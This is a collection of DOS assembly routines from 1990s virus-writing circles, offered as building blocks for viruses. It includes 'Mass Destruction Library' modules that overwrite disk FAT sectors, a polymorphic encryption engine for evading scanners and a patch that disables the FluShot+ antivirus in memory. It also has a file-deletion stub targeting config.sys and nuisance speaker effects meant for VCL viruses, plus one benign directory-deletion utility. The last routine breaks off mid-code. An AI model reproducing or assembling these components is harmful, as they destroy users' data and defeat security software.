;ALTER_FAT - module for Mass Destruction Library
;written by Evil Avatar
; Altera la FAT

alter_fat:
        push dx
        push bx
        push cx
        push ax
        push bp               ;save regs that will be changed
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h        
        int 21h               ;get default disk
        xor dx, dx            
        call load_sec         ;read in the boot record
        mov bp, bx
        mov bx, word ptr es:[bp+16h]  ;find sectors per fat
        push ax               ;save drive number
        call rnd_num          ;get random number
        cmp bx, ax            ;if random number is lower than
        jbe alter_fat1        ;secs per fat then jump and kill 'em
        mov ax, bx            ;else pick final sector of fat
alter_fat1:        
        xchg ax, dx           ;put sector number into dx
        pop ax
        mov cx, 1
        int 26h               ;write sectors
        add dx, bx            ;change to next fat (assumed 2 fats)
        int 26h               ;write same data in that fat
        pop bp        
        pop ax
        pop cx
        pop bx
        pop dx
        ret                   ;restore regs and return

;;;;;;;;;;;;

;ARCADEZ effect for VCL. 
;Maddening, if it goes on forever or shows up at inappropriate time.

code_seg        segment
        assume  cs:code_seg
        
        org     100h
        
        jmp     start

start   proc    near
        
        call    arcade_a             ;call arcade_a, dummeh!
        call    arcade_b             ;call arcade_b
        jmp     start                ;do it again

start   endp
;-------------------------------------------
arcade_a        proc    near
        cli                          ;off the interrupts 
        mov     di,2                 ;repeat whole thing twice
agin1:  mov     bp,20                ;20 cycles of sound
        mov     al,10110110b         ;magic number
        out     43h,al               ;send it to timer
        mov     bx,1000              ;start frequency high
agin2:  mov     ax,bx                ;place it in (ax)
        out     42h,al               ;send LSB 
        mov     al,ah                ;place MSB in al
        out     42h,al               ;now we send it
        in      al,61h               ;get value from port
        or      al,00000011b         ;ORing turns on speaker
        out     61h,al               ;send it to port
        mov     cx,35000             ;our delay count
looperx:loop    looperx              ;do nothing loop so we can hear sound
        add     bx,50                ;to lower frequency for next pass
        in      al,61h               ;get value from speaker port
        and     al,11111100b         ;turns speaker off
        out     61h,al               ;send it
        dec     bp                   ;decrement cycle count
        jnz     agin2                ;if not = 0 do again
        mov     cx,60000             ;else load (cx) for 2nd delay
looperf:loop    looperf              ;do nothing loop
        dec     di                   ;decrement repeat count
        jnz     agin1                ;do hole thing again if not = 0
                                     ;and leave
        ret
arcade_a        endp
;-------------------------------------
arcade_b        proc    near
         
        mov     di,2                 ;repeat whole thing twice
agin3:  mov     bp,20                ;20 cycles of sound
        mov     al,10110110b         ;magic number
        out     43h,al               ;send it to timer
        mov     bx,2000              ;start frequency low
agin4:  mov     ax,bx                ;place it in (ax)
        out     42h,al               ;send LSB 
        mov     al,ah                ;place MSB in al
        out     42h,al               ;now we send it
        in      al,61h               ;get value from port
        or      al,00000011b         ;ORing turns on speaker
        out     61h,al               ;send it to port
        mov     cx,35000             ;our delay count
looperl:loop    looperl              ;do nothing loop so we can hear sound
        sub     bx,50                ;to rise frequency for next pass
        in      al,61h               ;get value from speaker port
        and     al,11111100b         ;turn speaker off
        out     61h,al               ;send it
        dec     bp                   ;decrement cycle count
        jnz     agin4                ;if not = 0 do again
        mov     cx,60000             ;else load (cx) for 2nd delay
looperk:loop    looperk              ;do nothing loop
        dec     di                   ;decrement repeat count
        jnz     agin3                ;do hole thing again if not = 0
                                     ;and leave
        ret
arcade_b        endp
;-------------------------------------
code_seg        ends
     end        start

;;;;;;;;;;

; Hace sonar el BEEP la cantidad de veces especificada
beeps equ 10 ; Cantidad

        mov cx,beeps
        mov     ax,0E07h                ; BIOS display char., BEL
beep_loop:
        int     010h                    ; Beep
        loop    beep_loop               ; Beep until --CX = 0
        ret

;;;;;;;;;;

; ==========================================================================>
;  BWME : A (very) basic polymorphic engine 
;  Written for Biological Warfare v1.00
;  By MnemoniX - Version 1.00 1994
;  Size : 609 Bytes
;  Modification is permitted - nay, encouraged - but please maintain the
;  "BWME" signature.
;
;  Usage :
;
;          Fill registers with appropriate data:
;
;                       DS:SI - code to encrypt
;                       ES:DI - space for encrypted code
;                       CX - size of code
;                       DX - offset of encrypted when run
;
;          Use "call _bwme" to call
;          and at end of program include the line :
;
;                       include bwme.asm
;
;          On return, DS:DX points to space for encrypted code
;          and CX holds the size of the encrypted module.
; ==========================================================================>

_BWME:
                jmp     _bwme_stuff

                db      '[BWME]'

_bwme_stuff:
                push    ax bx es di es di si bp

                call    $ + 3                   ; get our offset
                pop     bp
                sub     bp,offset $ - 1

; 1) Fill in variables with random numbers.

                call    randomize               ; fix random number generator

                push    es di
                lea     di,[bp + reg_1]
                push    cs
                pop     es

                xor     bl,bl
                call    get_register            ; get registers
                stosb                           ; (won't be SP or one
                mov     bl,3
                call    get_register            ;  already used)
                stosb

                mov     al,3                    ; ADD, SUB or XOR?
                call    _random
                stosb

                or      al,-1                   ; random number
                call    _random
                stosb
                
                pop     di es
                mov     cs:[bp + started_at],di ; save starting address

; 2) Fill decryptor registers

                push    ds
                push    cs                      ; DS temporarily = to CS
                pop     ds

                call    garbage                 ; garbage instruction

                call    head_tail               ; load counter or offset?
                jc      counter_first

                call    load_offset             ; offset first
                call    load_counter
                jmp     decryptor

counter_first:
                call    load_counter            ; counter first
                call    load_offset
                jmp     decryptor

load_offset:
                mov     al,[bp + reg_2]
                call    garbage
                add     al,0B8h
                stosb
                mov     [bp + offset_at],di     ; fill the offset value later
                stosw
                ret
load_counter:
                mov     al,[bp + reg_1]         ; counter register
                call    garbage
                add     al,0B8h
                stosb
                mov     ax,cx                   ; store program size
                stosw
                ret

; 3) Load up decryption routine & fix encryption routine

decryptor:
                push    di                      ; save this offset
                call    garbage                 ; more garbage

                mov     ax,802Eh
                stosw

                mov     al,[bp + operation]

                test    al,al                   ; 0 = ADD
                je      do_add
                cmp     al,1                    ; 1 = SUB
                je      do_sub
                                                ; 2 = XOR
                mov     al,30h                  ; get proper operation
do_add:
                push    ax
                cmp     al,28h                  ; if SUB,ADD when encrypting
                je      encrypt_add
                test    al,al
                je      encrypt_sub             ; and vice versa

                mov     al,32h                  ; fix encryption routine
                mov     [bp + encrypt_oper],al  ; same for XOR
                jmp     decryptor_stuff

encrypt_add:
                mov     al,2
                jmp     encrypt_move
encrypt_sub:
                mov     al,2Ah
encrypt_move:
                mov     [bp + encrypt_oper],al

decryptor_stuff:
                pop     ax
                mov     ah,[bp + reg_2]         ; get offset register

                cmp     ah,3                    ; BX
                je      its_bx
                cmp     ah,6                    ; SI
                je      its_si
                ja      its_di                  ; DI

                add     al,46h                  ; BP (word)
                xor     ah,ah
                stosw
                jmp     load_value

its_bx:         add     al,2                    ; this loads up the proper
its_di:         inc     ax                      ; operation instruction
its_si:         add     al,4
                stosb
                jmp     load_value

do_sub:
                mov     al,28h
                jmp     do_add

load_value:
                mov     al,[bp + random_no]
                stosb

; 4) Increment offset register

loaded:
                call    garbage                 ; garbage
                call    head_tail               ; now increment offset reg
                jc      use_increments          ; with INCs or ADDs

                mov     ax,0C083h               ; use an ADD
                add     ah,[bp + reg_2]
                stosw

                mov     al,1
                stosb
                jmp     fix_counter

use_increments:
                mov     al,40h
                add     al,[bp + reg_2]
                stosb

; 5) Decrement counter register & make loop

fix_counter:
                cmp     [bp + reg_1],1          ; if CX, we can use LOOP
                jne     no_loop
                call    head_tail               ; if we want to
                jc      use_loop

no_loop:
                call    garbage
                call    head_tail               ; INC or SUB?
                jc      use_decrement

                mov     ax,0E883h               ; use a SUB
                add     ah,[bp + reg_1]
                stosw
                mov     al,1
                stosb
                jmp     now_jnz

use_loop:
                call    garbage
                pop     ax                      ; offset of decryptor
                sub     ax,di
                sub     al,2
                mov     ah,al
                mov     al,0E2h                 ; store LOOP instruction
                stosw
                jmp     fix_offset

use_decrement:
                mov     al,48h
                add     al,[bp + reg_1]
                stosb

now_jnz:
                pop     ax                      ; offset of decryptor
                sub     ax,di
                sub     al,2
                mov     ah,al
                mov     al,75h                  ; store JNZ instruction
                stosw

; 6) Fix offset register now

fix_offset:
                call    garbage                 ; one last garbage dump

                mov     ax,[bp + started_at]    ; calculate our offset
                sub     ax,di                   ; relative to runtime offset
                neg     ax
                add     ax,dx

                mov     bx,[bp + offset_at]
                mov     es:[bx],ax              ; done

; 7) and now ... we encrypt ....

encryption:
                pop     ds                      ; restore DS
                push    ax                      ; use this later
                push    cx                      ; save size of code

                mov     bl,cs:[bp + random_no]

encrypt_it:
                lodsb
encrypt_oper    db      0
                db      0C3h
                stosb
                loop    encrypt_it

                pop     cx                      ; size of code

                pop     ax
                sub     ax,dx                   ; plus decryption module
                add     cx,ax                   ; done ...
                jmp     bwme_done

; the heap

reg_1           db      4                       ; counter register
reg_2           db      4                       ; offset register
operation       db      0                       ; operation
random_no       db      0                       ; random number

started_at      dw      0                       ; beginning of code
offset_at       dw      0                       ; offset register load

rand_seed       dw      0

; randomize routine

randomize:
                push    cx dx
                xor     ah,ah                   ; get timer count
                int     1Ah
                mov     cs:[bp + rand_seed],dx
                xchg    ch,cl
                add     cs:[bp + rand_seed_2],cx
                pop     dx cx
                ret

; head/tail routine

head_tail:
                mov     ax,2                    ; get a 0 or 1 value
                call    _random                 ; and move CF
                test    al,al
                jz      _head_
                stc
                ret
_head_:         clc
                ret

; get register routine

get_register:
                mov     ax,8                    ; get register
                call    _random
check_reg:
                cmp     al,4                    ; can't use SP or used ones
                je      no_good
                cmp     al,bl
                jb      no_good
                cmp     al,cs:[bp + reg_1]
                je      no_good
                cmp     al,cs:[bp + reg_2]
                je      no_good
                ret                             ; it's good
no_good:
                test    al,al
                jz      blah_blah
                dec     al
                jmp     check_reg
blah_blah:
                mov     al,7
                jmp     check_reg

; random number generator

_random:
                push    cx dx ax                ; save regs
                in      al,40h                  ; timer, for random #
                sub     ax,cs:[bp + rand_seed]
                db      35h                     ; XOR AX,
rand_seed_2     dw      0
                inc     ax
                add     cs:[bp + rand_seed],ax  ; change seed
                xor     dx,dx
                pop     cx
                test    ax,ax                   ; avoid divide by zero
                jz      no_divide
                div     cx
no_divide:
                mov     ax,dx                   ; remainder is the value
                pop     dx cx                   ; returned
                ret

; garbage instruction generator

garbage:
                push    ax
                mov     ax,8                    ; decisions, decisions ...
                call    _random                 ; what garbage to use?

                cmp     al,1                    ; 1 = NOP or SAHF
                je      nop_sahf
                cmp     al,2                    ; 2 = operate, unused reg.
                je      nothing_oper
                cmp     al,3                    ; 3 = STC or CMC
                je      stc_cmc
                cmp     al,4                    ; 4 = jump to next
                je      nothing_jmp             ;     instruction
                cmp     al,5                    ; 5 = CMP instruction
                je      nothing_cmp

garbage_done:
                pop     ax                      ; garbage in, garbage out
                ret

nop_sahf:
                call    head_tail               ; NOP or SAHF
                je      use_sahf
                mov     al,90h
store_gbg:      stosb
                jmp     garbage_done
use_sahf:       mov     al,9Eh
                jmp     store_gbg

nothing_oper:
                xor     bl,bl
                call    get_register
                add     al,0B8h
                stosb
                or      ax,-1
                call    _random
                stosw
                jmp     garbage_done

stc_cmc:
                call    head_tail               ; STC or CMC
                jc      use_cmc
                mov     al,0F9h
                jmp     store_gbg
use_cmc:        mov     al,0F5h
                jmp     store_gbg

nothing_jmp:
                mov     ax,10h                  ; random jump instruction
                call    _random
                add     al,70h
                xor     ah,ah
                stosw
                jmp     garbage_done

nothing_cmp:
                mov     ax,800h                 ; nothing CMP
                call    _random
                xor     al,al
                add     ax,0F881h
                stosw
                call    _random
                stosw
                jmp     garbage_done

bwme_done:
                pop     bp si dx ds di es bx ax
                ret
_bwme_end:

;;;;;;;;;;

Comment |
******************************************************************

File:       DELDIR.ASM
Author:     Allen L. Wyatt
Date:       6/18/92
Assembler:  MASM 6.0

Purpose:    Delete specified directory and all subdirectories to it

Format:     DELDIR [path]

******************************************************************|

            .MODEL  small
            .STACK                      ;Default 1Kb stack is OK
            .DATA

FileCount   DW      0
DirCount    DW      0

CurDrive    DB      'C:'
CurDir      DB      '\', 65 DUP(0)
WorkDrive   DB      'C:'
WorkOrig    DB      '\', 65 DUP(0)
WorkDir     DB      '\', 128 DUP(0)

MaxDrives   DB      0
Wild        DB      '*.*',0
Parent      DB      '..',0

DriveEMsg   DB      'Invalid drive',13,10,0
DirEMsg     DB      'Invalid directory',13,10,0
Sure        DB      'Delete everything on the '
SureDrive   DB      '?: drive (y/n)? ',0
RemDir      DB      'Removing ',0
DirMsgS     DB      ' directory was removed',13,10,0
DirMsgP     DB      ' directories were removed',13,10,0
FileMsgS    DB      ' file was deleted',13,10,0
FileMsgP    DB      ' files were deleted',13,10,0
DoneMsg     DB      'Program finished'
CRLF        DB      13,10,0

            .CODE
            .STARTUP
DelDir      PROC

; The following memory allocation code works because it is known that MASM
; sets DS and SS to the same segment address in the startup code.  Also, ES
; is set to the PSP for the program upon entry.

            MOV     BX,DS               ;Point to start of data segment
            MOV     AX,ES               ;Point to start of PSP
            SUB     BX,AX               ;Number of segments for code & data
            MOV     AX,SP               ;SP is point
                        MOV             CL,4
                        SHR             AX,CL
                        ADD             BX,AX
                        MOV             AH,4AH
                        INT             21H

;    get the current drive and directory

            MOV     AH,19h              ;?Get current drive
            INT     21h
            MOV     DL,AL               ;Move drive for next operation
            ADD     AL,'A'              ;?Make it ASCII
            MOV     CurDrive,AL         ;Store it for later
            MOV     WorkDrive,AL
            MOV     SureDrive,AL

            MOV     AH,0Eh              ;Select default drive
            INT     21h
            MOV     MaxDrives,AL        ;Store number of drives

            MOV     DL,0                ;Use current drive
            MOV     AH,47h              ;Get current directory
            MOV     SI,OFFSET CurDir    ;Point to directory buffer
            INC     SI                  ;Point past leading backslash
            INT     21h
            MOV     DL,0                ;Use current drive
            MOV     AH,47h              ;Get current directory
            MOV     SI,OFFSET WorkDir   ;Point to working directory buffer
            INC     SI                  ;Point past leading backslash
            INT     21h

            CALL    Parse               ;Go parse command tail file name

            MOV     DL,WorkDrive
            CMP     DL,CurDrive         ;Still working on same drive
            JE      DriveOK             ;Yes, so continue
            SUB     DL,'A'              ;Make drive zero-based
            CMP     DL,MaxDrives        ;Out of range?
            JA      DriveErr            ;Yes, exit with error
            MOV     AH,0Eh              ;No, set current drive
            INT     21h

            MOV     DL,0                ;Use current drive (new drive)
            MOV     AH,47h              ;Get directory on new drive
            MOV     SI,OFFSET WorkOrig  ;Point to directory buffer
            INC     SI                  ;Point past leading backslash
            INT     21h

DriveOK:    MOV     AL,WorkDir
            CMP     AL,0                ;Any directory to use?
            JE      GetDir              ;No, so get where we are
            MOV     DX,OFFSET WorkDir   ;Point to new directory
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h
            JC      DirBad              ;Bad move

; Even though the directory was possibly just set, it is important to
; get the directory again, because the command line could have used
; relative directory addressing.  Getting the directory one more time
; ensures that absolute directory addressing is used.

GetDir:     MOV     DL,0                ;Use current drive
            MOV     WorkDir,'\'
            MOV     SI,OFFSET WorkDir
            INC     SI                  ;Point past leading backslash
            MOV     AH,47h              ;Get current directory
            INT     21h
            JMP     DirOK

DirBad:     MOV     SI,OFFSET DirEMsg
            JMP     ErrMsg
DriveErr:   MOV     SI,OFFSET DriveEMsg
ErrMsg:     CALL    PrtString           ;Display the string at DS:SI
            JMP     Done

DirOK:      CMP     WorkDir+1,0         ;At root directory?
            JNE     Start
            MOV     SI,OFFSET Sure
            CALL    PrtString
InLoop:     MOV     AH,0                ;Read keyboard character
            INT     16h
            OR      AL,20h              ;Convert to lowercase
            CMP     AL,'n'              ;Was it no?
            JE      GoodKey
            CMP     AL,'y'              ;Was it yes?
            JNE     InLoop
GoodKey:    MOV     SI,OFFSET CRLF
            CALL    PrtString
            CMP     AL,'n'              ;Was it no?
            JE      Done                ;Yes, so exit program

Start:      CALL    DoDir               ;Go erase this directory
            CMP     WorkDir+1,0         ;At root directory?
            JE      Stats               ;Yes, so don't try to remove

            MOV     DX,OFFSET Parent    ;Point to '..'
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h

            MOV     SI,OFFSET RemDir
            CALL    PrtString           ;Display the string at DS:SI
            MOV     SI,OFFSET WorkDir
            CALL    PrtString           ;Display the string at DS:SI
            MOV     SI,OFFSET CRLF
            CALL    PrtString

            MOV     DX,OFFSET WorkDir   ;Point to original directory
            MOV     AH,3Ah              ;Remove directory at DS:DX
            INT     21h
            JC      Stats               ;Couldn't remove directory
            INC     DirCount

Stats:      MOV     AX,DirCount
            CMP     AX,0                ;Any directories deleted?
            JE      Stats2              ;No, continue
            CALL    PrtDec
            MOV     SI,OFFSET DirMsgS   ;Point to singular message
            CMP     AX,1                ;Singular directories?
            JE      Stats1              ;Yes, so print singular message
            MOV     SI,OFFSET DirMsgP   ;Point to plural message
Stats1:     CALL    PrtString           ;Display the string at DS:SI

Stats2:     MOV     AX,FileCount
            CMP     AX,0                ;Any files deleted?
            JE      Done                ;No, so finish up
            CALL    PrtDec
            MOV     SI,OFFSET FileMsgS  ;Point to singular message
            CMP     AX,1                ;Singular files?
            JE      Stats3              ;Yes, so print singular message
            MOV     SI,OFFSET FileMsgP  ;Point to plural message
Stats3:     CALL    PrtString           ;Display the string at DS:SI

Done:       MOV     DL,CurDrive         ;Move drive for next operation
            CMP     DL,WorkDrive        ;Same as original?
            JE      Done1               ;Yes, so continue
            MOV     DX,OFFSET WorkOrig  ;Original directory on target drive
            MOV     AH,3Bh              ;Set current directory (if possible)
            INT     21h
            MOV     DL,CurDrive         ;Get calling drive
            SUB     DL,'A'              ;Make it zero-based
            MOV     AH,0Eh              ;Set current drive
            INT     21h

Done1:      MOV     DX,OFFSET CurDir    ;Point to new directory
            MOV     AH,3Bh              ;Set current directory
            INT     21h
            MOV     SI,OFFSET DoneMsg   ;Final message
            CALL    PrtString
            .EXIT
DelDir      ENDP


Comment |
=====================================================================
   The following routine does the following:
      1. Set up a memory block and header information (see SetHdr)
      2. Deletes files in current directory one at a time
      3. Recurrsively calls DoDir when new subdirectories encountered
      4. Reset DTA to original area and releases memory block
      5. Returns to caller
=====================================================================|

DoDir       PROC    ;USES AX BX CX DX SI DI ES
            CALL    SetHdr              ;Allocate memory and set header info

            MOV     DX,OFFSET Wild      ;Point to *.*
            MOV     CX,16h              ;Want normal, hidden, system, and vol
            MOV     AH,4Eh              ;Search for first match
            INT     21h
            JC      NoFile              ;No file found
            JNC     FoundOne            ;Go handle file found

NextFile:   MOV     AH,4Fh              ;Search for next file
            INT     21h
            JC      NoFile              ;No file found

FoundOne:   MOV     DX,1Eh              ;ES:DX points to name in DTA
            MOV     AL,ES:[15h]         ;Get file attribute
            CMP     AL,10h              ;Is it a directory?
            JNE     FoundFile           ;No, so go handle

            MOV     AL,ES:[1Eh]         ;Get first character of directory
            CMP     AL,'.'              ;Is it . or ..?
            JE      NextFile            ;Yes, so ignore
            CALL    DirOut              ;Go delete an entire directory
            JMP     NextFile            ;Go search for next entry

FoundFile:  CALL    FileOut             ;Go delete the file that was found
            JMP     NextFile            ;Go search for next entry

; By this point, there are no more files left.  Switch back to o�iginal
; DTA and release memory block requested by SetHdr.

NoFile:     PUSH    DS
            MOV     SI,128              ;Point to old DTA address
            MOV     AX,ES:[SI]
            INC     SI
            INC     SI
            MOV     DX,ES:[SI]          ;Get stored offset
            MOV     DS,AX
            MOV     AH,1Ah              ;Set DTA address
            INT     21h
            POP     DS

            MOV     AH,49h              ;Release memory block at ES
            INT     21h

DDDone:     RET
DoDir       ENDP


Comment |
=====================================================================
  The following routine is used by DoDir to set up the new DTA and header
  area for this iteration of the deletion process.  On exit, ES points to
  the segment of the memory area.  All other registers remain unchanged.

  Memory block structure:
    Start   Len     Use
      0     128     DTA for new directory work
    128       2     Segment pointer for old DTA
    130       2     Offset pointer for old DTA
    132      12     Unused area
=====================================================================|

SetHdr      PROC    ;USES AX BX CX DI SI DS
            MOV     AH,48h              ;Allocate memory
            MOV     BX,09h              ;Requesting 144 bytes
            INT     21h
            MOV     ES,AX               ;Point to memory block for later use
            MOV     DS,AX               ;Point for current use

            MOV     AL,0                ;Zero out the newly acquired buffer
            MOV     DI,0
            CLD                         ;Make sure going in proper direction
            MOV     CX,144
            REP     STOSB

            PUSH    ES                  ;Store temporarily
            MOV     AH,2Fh              ;Get DTA address
            INT     21h
            MOV     SI,128              ;Point to address area in buffer
            MOV     AX,ES
            MOV     [SI],AX             ;Store segment of DTA
            INC     SI
            INC     SI
            MOV     [SI],BX             ;Store offset of DTA
            POP     ES                  ;Get back old ES

            MOV     DX,0                ;DS:DX points to new DTA
            MOV     AH,1Ah              ;Set DTA address
            INT     21h
            RET
SetHdr      ENDP

; Delete file pointed to by ES:DX, then increment counter

FileOut     PROC    ;USES AX CX DS
            PUSH    DS
            PUSH    ES
            POP     DS
            MOV     AH,43h              ;Set file attributes of file at DS:DX
            MOV     AL,01h
            MOV     CX,0                ;No attributes
            INT     21h
            MOV     AH,41h              ;Delete file at DS:DX
            INT     21h
            POP     DS                  ;Reset DS
            JC      FO9                 ;File was not deleted
            INC     FileCount
FO9:        RET
FileOut     ENDP

; Delete the directory pointed to by ES:DX, then increment counter

DirOut      PROC    ;USES AX BX SI DS
            PUSH    DS                  ;Store it
            PUSH    ES
            POP     DS
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h
            POP     DS
            CALL    DoDir               ;Recurrsive call for new dir
            MOV     DX,OFFSET Parent    ;Point to '..'
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h

            MOV     SI,OFFSET RemDir
            CALL    PrtString           ;Display the string at DS:SI
            MOV     AH,2Fh              ;Get DTA address into ES:BX
            INT     21h
            ADD     BX,1Eh              ;Offset to file name (directory)
            PUSH    DS                  ;Store DS temporarily
            PUSH    ES
            POP     DS
            MOV     SI,BX
            CALL    PrtString           ;Display the string at DS:SI
            MOV     DX,BX
            MOV     AH,3Ah              ;Remove directory at DS:DX
            INT     21h
            POP     DS
            JC      DO9                 ;Directory not removed
            INC     DirCount
DO9:        MOV     SI,OFFSET CRLF
            CALL    PrtString
            RET
DirOut      ENDP

; The following routine prints the value in AX as a decimal number

PrtDec      PROC    ;USES AX CX DX
            MOV     CX,0FFFFh           ;Ending flag
            PUSH    CX
            MOV     CX,10
PD1:        MOV     DX,0
            DIV     CX                  ;Divide by 10
            ADD     DL,30h              ;Convert to ASCII
            PUSH    DX                  ;Store remainder
            CMP     AX,0                ;Are we done?
            JNE     PD1                 ;No, so continue

PD2:        POP     DX                  ;Character is now in DL
            CMP     DX,0FFFFh           ;Is it the ending flag?
            JE      PD3                 ;Yes, so continue
            MOV     AH,02h              ;Output a character
            INT     21h
            JMP     PD2                 ;Keep doing it

PD3:        RET
PrtDec      ENDP

; The following routine prints the ASCIIZ string pointed to by DS:SI

PrtString   PROC    ;USES AX DX SI
PS1:        MOV     DL,[SI]             ;Get character
            INC     SI                  ;Point to next one
            CMP     DL,0                ;End of string?
            JE      PS2                 ;Yes, so exit
            MOV     AH,02h              ;Output a character
            INT     21h
            JMP     PS1                 ;Keep doing it
PS2:        RET
PrtString   ENDP

; Parses a command line parameter into the file name work area

Parse       PROC    ;USES AX CX SI DI ES DS
            PUSH    ES              ;Swap ES and DS
            PUSH    DS
            POP     ES
            POP     DS
            MOV     SI,80h
            MOV     CL,[SI]         ;Get command tail length
            MOV     CH,0
            JCXZ    PDone           ;Nothing there to parse
            INC     SI              ;Point to first character of command tail
            MOV     DI,OFFSET ES:WorkDir
P1:         LODSB
            CMP     AL,' '          ;Was it a space?
            JE      P4              ;Yes, so skip it
            CMP     AL,':'          ;Was it a drive designator?
            JNE     P3              ;No, so continue
            DEC     SI              ;Point to character before colon
            DEC     SI
            LODSB
            CALL    ToUC            ;Convert to uppercase
            INC     SI              ;Point past the colon
            MOV     ES:WorkDrive,AL
            MOV     ES:SureDrive,AL ;Store it for message
            MOV     DI,OFFSET ES:WorkDir ;Begin path again
            JMP     P4
P3:         CALL    ToUC            ;Convert to uppercase
            STOSB                   ;Store a byte
P4:         LOOP    P1              ;Keep going to the end
            MOV     AL,0
            STOSB                   ;Make sure NUL at end of path
PDone:      RET
Parse       ENDP

; Converts the character in AL to uppercase.  All other registers unchanged.

ToUC        PROC
            CMP     AL,'a'          ;Lowercase?
            JB      T9
            CMP     AL,'z'
            JA      T9
            SUB     AL,20h          ;Convert to uppercase
T9:         RET
ToUC        ENDP

            END

;;;;;;;;;;;

; Borra el archivo especificado en 'erasethis'

        mov     ah,41h
        mov dx,offset erasethis
        add dx,bp
        int     21h
        ret
erasethis db 'c:\config.sys',0

;;;;;;;;;;;

;FAT_FUCK - module for Mass Destruction Library
;written by Evil Avatar
; Destruye la FAT

fat_fuck:
        push cx
        push bp
        push ax
        push dx               ;save regs that will be changed
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h
        int 21h               ;get default disk
        xor dx, dx
        call load_sec         ;load boot sector
        mov bp, bx
        mov cx, es:[bp+16h]   ;get number of secs per fat
        add cx, cx
        mov dx, 1
        int 26h               ;fuck both fats
        pop dx
        pop ax
        pop bp
        pop cx
        ret                   ;restore regs and return

;;;;;;;;;;;

; FLU_NOT.ASM � Routines to be linked into your FluShot+ resistant
;             � programs.
; Version 1.0 � 27 November 1991
;
; Written by Dark Angel and Demogorgon of PHALCON/SKISM Co-op
; Look for more Anti-Anti-Viral Utilities from us!
;
; Notes:
;  This is different from the C routines.  Call Flu_Not to disable and
;  Flu_Restore to reenable (at the end of your program, of course).  Try
;  not to call Flu_Not more than once in your program.  To disable again,
;  simply use:
;    les si, dword ptr flu_off
;    mov es:[si], 593Ch
;  (actually, this probably won't work in the .ASM file, but you can write
;   the routine yourself and put it in this file.)

        Public  Flu_Not, Flu_Restore
CODE    SEGMENT BYTE PUBLIC  'CODE'
        ASSUME  CS:CODE
        org     100h

flu_off dd      0
flu_seg dd      0

Flu_Not Proc    Near
        push    ax
        push    bx
        push    bp
        mov     word ptr cs:[flu_seg], 0

        mov     ax, 0FF0Fh                      ; Check if FluShot+ resident
        int     21h
        cmp     ax, 0101h
        jnz     No_puny_flus                    ; If not, no work to be done
Kill_Puny_Flus:                                 ; Otherwise, find the
        push    es                              ; FluShot+ segment

        xor     ax, ax
        mov     es, ax
        mov     bx, 004Eh                       ; Get int 13h handler's
        mov     ax, es:[bx]                     ;  segment
        mov     es, ax                          ; ES is now FSEG - YES!

        mov     bp, 1000h                       ; Start at FSEG:1000
Froopy_Loopy:
        cmp     word ptr es:[bp], 593Ch         ; Try to find marker bytes
        jz      Happy_Loop                      ; NOTE: No need to set
        inc     bp                              ;  counter because FluShot+
        jmp     Froopy_Loopy                    ;  is guaranteed to be in
Happy_Loop:                                     ;  memory by the INT 21h call
        cmp     word ptr es:[bp], 'RP'          ; Look backwards for the
        jz      Found_It_Here                   ;  beginning of the function
        dec     bp
        jmp     Happy_Loop
; If you are paranoid, you can add other checks, such as
; (in Froopy_Loopy) cmp bp, 5000h, jz No_Puny_Flus and
; (in Happy_Loop) cmp bp, 1000h, jz No_Puny_Flus, but there
; is really no need.
Found_It_Here:
        mov     word ptr es:[bp], 0C3F8h        ; Key to everything - replace
        mov     word ptr cs:[flu_seg], es       ;  function's starting bytes
        mov     word ptr cs:[flu_off], bp       ; Save the flu_offset
        pop     es
No_Puny_Flus:
        pop     bp
        pop     bx
        pop     ax
        ret
Flu_Not Endp

Flu_Restore Proc Near
        push    ax
        push    bx
        push    es
        les     bx, dword ptr cs:[offset flu_off]      ; Load ES:BX with Seg:Off
        mov     ax, es
        or      ax, ax
        jz      No_FluShot

        mov     word ptr es:[bx], 5250h

No_FluShot:
        pop     es
        pop     bx
        pop     ax
        ret
Flu_Restore Endp

CODE    ENDS
        END

;;;;;;;;;;;

;FUNKYBOM sound effect for VCL.  This sound is real close
;to one of the sounds (the FUNKY BOMB, I think) 
;in Wendell Hicken's SCORCH 1.1 artillery/tank
;game. (free plug: I love it - get a copy for yourself, you won't regret it.)
;And, for the moment, it completes this pack of sound fx handily made so
;you can jack them right into your favorite kustom VCL virus and assemble
;with TASM. [Notice, too, that FUNKYBOM uses almost exactly the same
;routines as ARCADEZ.]

code_seg        segment
        assume  cs:code_seg
        
        org     100h
        
        jmp     start

tone1    dw     0

start   proc    near
        
        call    arcade_a             ;call arcade_a, dummeh!
        call    arcade_b             ;call arcade_b
        jmp     start                ;do it again

start   endp
;-------------------------------------------
arcade_a        proc    near
        cli                          ;no interrupts
        mov     si,2                 ;do whole thing twice
agin1:  mov     bp,20                ;we want 20 cycles of sound
        mov     al,10110110b         ;must address channel 2
        out     43h,al               ;mode 3 - send it
        mov     bx,100               ;start frequency very high
agin2:  mov     ax,bx                ;place in (ax)
        out     42h,al               ;send LSB
        mov     al,ah                ;move MSB into (al)
        out     42h,al               ;send it to port
        in      al,61h               ;get value from speaker port
        or      al,00000011b         ;ORing turns speaker on
        out     61h,al               ;send it
        mov     cx,30000             ;our delay count 
looperq:loop    looperq              ;do nothing loop so we can hear sound
        add     bx,50                ;lower frequency a bit for next pass
        in      al,61h               ;get value from port
        and     al,11111100b         ;turns speaker off 
        out     61h,al               ;send it
        dec     bp                   ;decrement cycle count
        jnz     agin2                ;if not = 0 do again
        dec     si                   ;else decrement repeat count
        jnz     agin1                ;if not = 0 do whole thing again
                                     ;and leave
        ret
arcade_a        endp
;-------------------------------------
arcade_b        proc    near
        
        mov     di,4                 ;do sequence four times
agin3:  mov     bp,20                ;do twenty cycles of sound
        mov     al,10110110b         ;our magic number
        out     43h,al               ;send it to timer port
        mov     bx,1000              ;start frequency at 1000
agin4:  mov     ax,bx                ;put it in (ax)
        out     42h,al               ;send LSB
        mov     al,ah                ;put MSB in (al)
        out     42h,al               ;send it
        in      al,61h               ;get value from port
        or      al,00000011b         ;ORing turns speaker on
        out     61h,al               ;send it
        mov     cx,15000             ;our delay count
looperx:loop    looperx              ;do nothing loop so we can hear sound
        sub     bx,50                ;subtract 50 from frequency number
        in      al,61h               ;get port value
        and     al,11111100b         ;turns speaker on
        out     61h,al               ;send it
        dec     bp                   ;decrement cycle count
